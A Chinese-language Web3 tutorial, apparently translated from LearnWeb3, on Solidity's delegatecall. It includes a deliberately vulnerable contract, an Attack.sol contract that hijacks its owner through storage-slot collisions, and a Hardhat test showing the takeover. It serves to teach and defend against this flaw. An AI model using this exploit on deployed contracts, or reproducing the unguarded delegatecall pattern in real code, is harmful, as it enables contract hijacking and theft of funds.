---
title: Web3系列教程之高级篇---5：delegatecall委托调用漏洞
description: null
author: 李留白
weight: 0
date: 2022-08-04T13:43:08.841Z
lastmod: 2022-08-04T14:29:32.645Z
tags: []
categories:
  - 区块链
  - WEB3.0
featuredImage: https://hicoldcat.oss-cn-hangzhou.aliyuncs.com/img/R3RYera.png
---

![](https://hicoldcat.oss-cn-hangzhou.aliyuncs.com/img/20220804214339.png)

`.delegatecall() `是 Solidity 中的一个方法，用于从一个原始合约中调用目标合约中的一个函数。然而，与其他方法不同的是，当使用`.delegatecall()`在目标合约中执行函数时，上下文从原始合约中传递，即代码在目标合约中执行，但变量在原始合约中被修改。

通过本教程，我们将了解为什么正确理解`.delegatecall()`的工作原理很重要，否则会产生一些严重后果。

## 等等，什么？

让我们首先了解这一点是如何运作的。

在使用`.delegatecall()`时需要注意的是，原始合约的上下文被传递给目标合约，目标合约的所有状态变化都反映在原始合约的状态上，而不是目标合约的状态上，即使该函数是在目标合约上执行的。

嗯，不是很清楚吧，我理解。所以让我们试着通过一个例子来理解。

在以太坊中，一个函数可以表示为`4+32*N`字节，其中`4 bytes`为函数选择器，`32*N`字节为函数参数。

- 函数选择器。为了得到函数选择器，我们将函数的名称和它的参数类型进行散列，不留空隙，例如，对于像`putValue(uint value)`这样的东西，你将使用`keccak-256`散列`putValue(uint)`，这是Ethereum使用的一个散列函数，然后取其前4个字节。为了更好地理解keccak-256和散列，我建议你观看这个 [video](https://www.youtube.com/watch?v=rxZR3ITZlzE)

- 函数参数。将每个参数转换为固定长度为32字节的十六进制字符串，并将其连接起来。

我们有两个合约`Student.sol`和`Calculator.sol`。我们不知道`Calculator.sol`的ABI，但是我们知道他们存在一个`add`函数，这个函数接收两个`uint`，并在`Calculator.sol`中把它们加起来。

让我们看看如何使用`delegateCall`来从`Student.sol`中调用这个函数。

```solidity
pragma solidity ^0.8.4;

contract Student {

    uint public mySum;
    address public studentAddress;
    
    function addTwoNumbers(address calculator, uint a, uint b) public returns (uint)  {
        (bool success, bytes memory result) = calculator.delegatecall(abi.encodeWithSignature("add(uint256,uint256)", a, b));
        require(success, "The call to calculator contract failed");
        return abi.decode(result, (uint));
    }
}
```

```solidity
pragma solidity ^0.8.4;

contract Calculator {
    uint public result;
    address public user;
    
    function add(uint a, uint b) public returns (uint) {
        result = a + b;
        user = msg.sender;
        return result;
    }
}
```

我们的`Student`合同中有一个函数`addTwoNumbers`，它接收一个地址和两个要相加的数字。它没有直接执行它，而是试图在地址上执行一个`.delegatecall()`，以获取一个需要两个数字的函数`add`。

我们使用了`abi.encodeWithSignature`，也和`abi.encodeWithSelector`一样，它首先进行哈希运算，然后从函数的名称和参数类型中取出前4个字节。在我们的例子中，它做了以下工作。`(bytes4(keccak256(add(uint,uint))`，然后将参数--`a`，`b`附加到函数选择器的4个字节上。这些参数每个都是32字节长（32字节=256位，这也是`uint256`可以存储的）。

所有这些在串联后被传递到`delegatecall`方法中，该方法在计算器合同的地址上被调用。

实际的添加部分并不那么有趣，有趣的是，`Calculator`合约实际上设置了一些状态变量。但是请记住，当数值在`Calcultor`合约中被分配时，它们实际上是被分配到了`Student`合约的存储空间中，因为`deletgatecall`在目标合约中执行函数时使用的是原始合约的存储。因此，具体会发生什么情况如下。

![](https://hicoldcat.oss-cn-hangzhou.aliyuncs.com/img/20220804220118.png)

从以前的教程中你知道，solidity中的每个变量槽都是32字节，也就是256位。当我们使用`.delegatecall()`从`Student`到`Calculator`时，我们使用了`Student` 的存储空间，而不是`Calculator`的存储空间，但问题是，即使我们使用了`Student`的存储空间，槽的数量也是基于`Calculator`合约的，在这种情况下，当你在`Calculator.sol`的`add`函数中给结果赋值时，你实际上是给student 合约中的`mySum`赋值的。

这可能是个问题，因为存储槽可以有不同数据类型的变量。如果`Student`合约中的值是按照这个顺序定义的，会怎么样呢？

```solidity
contract Student {
    address public studentAddress;
    uint public mySum;
}
```

在这种情况下，`address`变量实际上最终会成为`result`的值。你可能会想，一个`address`数据类型怎么可能包含一个`uint`的值？要回答这个问题，你必须想得低一点。最后，所有的数据类型都只是字节。`address`和`uint`都是32字节的数据类型，所以`result`的`uint`值可以被设置在`address public studentAddress`变量中，因为它们都还是32字节的数据。

## 实际使用案例

`.delegatecall()`在代理（可升级）合约中被大量使用。由于智能合约在默认情况下是不可升级的，使其可升级的方法通常是有一个不改变的存储合约，其中包含一个实施合约的地址。如果你想更新你的合约代码，你就把执行合约的地址改成新的东西。存储合约使用`.delegatecall()`进行所有调用，这允许运行不同版本的代码，同时随着时间的推移保持相同的持久化存储，无论你改变多少个实现合约。因此，逻辑可以改变，但数据永远不会被分割。

## 使用委托调用（delegatecall）进行攻击

但是，由于`.delegatecall()`修改了调用该函数的合约的存储空间，如果`.delegatecall()`没有被正确实现，就会设计出一些讨厌的攻击。我们现在将模拟一个使用`.delegatecall()`的攻击。

## 将会发生什么?

- 我们将有三个智能合约Attack.sol、Good.sol和Helper.sol。
- 黑客将能够使用`Attack.sol`的`.delegatecall()`来改变`Good.sol`的所有者。

## 构建

让我们建立一个例子，你可以体验到攻击是如何发生的。

- 要设置一个Hardhat项目，请打开终端，在一个新的文件夹中执行这些命令

```bash
npm init --yes
npm install --save-dev hardhat
```

- 如果你使用的是Windows系统，请做这个额外的步骤，同时安装这些库 :)

```
npm install --save-dev @nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers
```

- 在你安装Hardhat的同一目录下运行。

```bash
npx hardhat
```

- 选择`Create a basic sample project`
- 对已指定的`Hardhat Project root`按回车键
- 如果你想添加一个`.gitignore`，请按回车键。
- 按回车键`Do you want to install this sample project's dependencies with npm (@nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers)?`

现在你有一个准备好的hardhat项目了!

让我们从创建一个看起来很无辜的合约开始--`Good.sol`。它将包含`Helper`合同的地址，以及一个叫做`owner`的变量。函数`setNum`将对`Helper`合约做一个`delegatecall）`。

```solidity
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract Good {
    address public helper;
    address public owner;
    uint public num;

    constructor(address _helper) {
        helper = _helper;
        owner = msg.sender;
    }

    function setNum( uint _num) public {
        helper.delegatecall(abi.encodeWithSignature("setNum(uint256)", _num));
    }
}
```

在创建完`Good.sol`之后，我们将在`contracts`目录下创建名为`Helper.sol`的`Helper`合同。这是一个简单的合约，通过`setNum`函数更新`num`的值。由于它只有一个变量，该变量将永远指向`Slot 0`。当与`delegatecall`一起使用时，它将修改原始合约中`Slot 0`的值。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract Helper {
    uint public num;

    function setNum(uint _num) public {
        num = _num;
    }
}
```

现在在`contracts`目录下创建一个名为`Attack.sol`的合同，并编写以下几行代码。我们将一步步了解它是如何工作的。

```solidity
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./Good.sol";

contract Attack {
    address public helper;
    address public owner;
    uint public num;

    Good public good;

    constructor(Good _good) {
        good = Good(_good);
    }

    function setNum(uint _num) public {
        owner = msg.sender;
    }

    function attack() public {
        // This is the way you typecast an address to a uint
        good.setNum(uint(uint160(address(this))));
        good.setNum(1);
    }
}
```

攻击者将首先部署`Attack.sol`合约，并在构造函数中获取一个`Good`合约的地址。然后，他将调用`attack`函数，该函数将进一步最初调用`Good.sol`中的`setNum`函数。

值得注意的是最初调用setNum的参数，它的地址被类型化为一个uint256，这是它自己的地址。在`Good.sol`合约中的`setNum`函数接收到作为uint的地址后，它进一步对`Helper`合约进行`delegatecall`，因为现在帮助者变量被设置为`Helper`合约的地址。

在`Helper`合约中，当setNum被执行时，它设置了`_num`，在我们的例子中，现在是`Attack.sol`的地址被打成一个uint，变成num。请注意，由于`num`位于`Helper`合约的`Slot 0`，它实际上会把`Attack.sol`的地址分配给`Good.sol`的`Slot 0`。喔... 你可能知道这是怎么回事了。`Good`的`Slot 0`是帮助者变量，这意味着，攻击者现在已经成功地将`p`地址变量更新到它自己的合同上。

现在，`helper`合同的地址已经被`Attack.sol`的地址覆盖了。在`Attack.sol`的`attack`函数中被执行的下一件事是另一个setNum，但数字为1。数字1在这里没有任何意义，它可以被设置为任何东西。

现在，当setNum在`Good.sol`中被调用时，它将把调用委托给`Attack.sol`，因为`helper`合约的地址已经被覆盖了。

`Attack.sol`内的`setNum`被执行，它将`owner`设置为`msg.sender`，在这种情况下就是`Attack.sol`本身，因为它是`delegatecall`的原始调用者，而且因为所有者在`Attack.sol`的`Slot 1`，`Good.sol`的`Slot 1`将被覆盖，也就是它的`owner`。

攻击者能够改变`Good.sol`的`owner`👀 🔥。

让我们试着用代码来实际执行这个攻击。我们将利用Hardhat测试来演示这个功能。

在`test`文件夹中创建一个名为`attack.js`的新文件并添加以下几行代码

```javascript
const { expect } = require("chai");
const { BigNumber } = require("ethers");
const { ethers, waffle } = require("hardhat");

describe("Attack", function () {
  it("Should change the owner of the Good contract", async function () {
    // Deploy the helper contract
    const helperContract = await ethers.getContractFactory("Helper");
    const _helperContract = await helperContract.deploy();
    await _helperContract.deployed();
    console.log("Helper Contract's Address:", _helperContract.address);

    // Deploy the good contract
    const goodContract = await ethers.getContractFactory("Good");
    const _goodContract = await goodContract.deploy(_helperContract.address);
    await _goodContract.deployed();
    console.log("Good Contract's Address:", _goodContract.address);

    // Deploy the Attack contract
    const attackContract = await ethers.getContractFactory("Attack");
    const _attackContract = await attackContract.deploy(_goodContract.address);
    await _attackContract.deployed();
    console.log("Attack Contract's Address", _attackContract.address);

    // Now lets attack the good contract

    // Start the attack
    let tx = await _attackContract.attack();
    await tx.wait();

    expect(await _goodContract.owner()).to.equal(_attackContract.address);
  });
});
```

要执行测试以验证`Good`合同的`owner`确实发生了变化，在你的终端上，指向包含本层所有代码的目录，执行以下命令

```bash
npx hardhat test
```

如果你的测试通过了，那么good合约的所有者地址确实被改变了，因为我们在测试结束时将`good`中的`owner`变量的值等同于`Attack`合约的地址。

开始吧🚀🚀

## 预防

使用无状态的合同库，这意味着你委托调用的合同应该只用于执行逻辑，不应该维护状态。这样一来，库中的函数就不可能修改调用合约的状态。

## 资料

- [Delegate call](https://medium.com/coinmonks/delegatecall-calling-another-contract-function-in-solidity-b579f804178c)
- [Solidity by Example](https://solidity-by-example.org/)

>原文：[https://www.learnweb3.io/tracks/senior/delegate-call](https://www.learnweb3.io/tracks/senior/delegate-call)

![](https://hicoldcat.oss-cn-hangzhou.aliyuncs.com/img/my.png)
